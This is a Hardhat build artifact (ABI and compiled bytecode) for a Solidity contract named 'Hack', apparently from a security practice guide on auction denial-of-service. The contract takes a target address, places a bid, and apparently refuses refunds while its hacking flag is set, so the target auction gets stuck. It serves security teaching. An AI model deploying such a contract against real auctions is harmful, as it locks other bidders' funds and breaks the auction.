{
  "_format": "hh-sol-artifact-1",
  "contractName": "Hack",
  "sourceName": "contracts/PracticeGuideDAO/Security/AuctionDenialOfService.sol",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_toHack",
          "type": "address"
        }
      ],
      "stateMutability": "payable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "disableHacking",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    }
  ],
  "bytecode": "0x608060408190525f805460ff60a01b1916600160a01b1790556101c83881900390819083398101604081905260329160a9565b60643414603d575f80fd5b5f80546001600160a01b0319166001600160a01b038316908117825560408051631998aeef60e01b815290519192631998aeef923492600480820193929182900301818588803b158015608e575f80fd5b505af1158015609f573d5f803e3d5ffd5b50505050505060d4565b5f6020828403121560b8575f80fd5b81516001600160a01b038116811460cd575f80fd5b9392505050565b60e8806100e05f395ff3fe608060405260043610601e575f3560e01c8063ca07a3a914604f575f80fd5b36604b575f5474010000000000000000000000000000000000000000900460ff161560495760496085565b005b5f80fd5b3480156059575f80fd5b5060495f80547fffffffffffffffffffffff00ffffffffffffffffffffffffffffffffffffffff169055565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52600160045260245ffdfea2646970667358221220e71524b0372b2ca8ca12dc8304db8379e589257347b71ab7b77326ed253abf4464736f6c634300081a0033",
  "linkReferences": {},
  "deployedLinkReferences": {}
}